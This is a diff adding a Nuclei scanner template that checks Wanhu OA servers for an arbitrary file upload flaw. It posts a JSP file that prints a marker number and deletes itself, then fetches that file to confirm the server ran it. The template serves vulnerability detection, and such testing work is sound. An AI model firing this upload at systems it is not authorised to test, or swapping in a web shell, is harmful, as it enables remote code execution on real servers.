@@ -1,0 +1,48 @@
+id: wanhu-oa-fileupload-controller-arbitrary-file-upload
+info:
+  name: wanhu-oa-fileupload-controller-arbitrary-file-upload
+  author: SleepingBag945
+  severity: critical
+  description: 万户OA fileUpload.controller 存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/万户OA/万户OA%20fileUpload.controller%20任意文件上传漏洞.html
+  tags: wanhu,oa
+
+http:
+  - raw:
+      - |
+        POST /defaultroot/upload/fileUpload.controller HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Content-Type: multipart/form-data; boundary=b0d829daa06c13d6b3e16b0ad21d1eed
+        Cookie: OASESSIONID=416B4CE965CD27DEED8197A8528A33E6
+
+        --b0d829daa06c13d6b3e16b0ad21d1eed
+        Content-Disposition: form-data; name="file"; filename="indh.jsp"
+        Content-Type: application/octet-stream
+
+        <%out.print(42285 * 41559);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        --b0d829daa06c13d6b3e16b0ad21d1eed--
+
+      - |
+        GET /defaultroot/upload/html/{{filename}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Encoding: gzip
+
+
+    extractors:
+      - type: regex
+        name: filename
+        internal: true
+        group: 1
+        regex:
+          - '"data":"(.*?)"'
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200 && contains(body_1, "\"result\":\"success\"") && contains(body_1,"fileSize")'
+          - 'status_code_2 == 200 && contains(body_2,"1757322315")'
+        condition: and
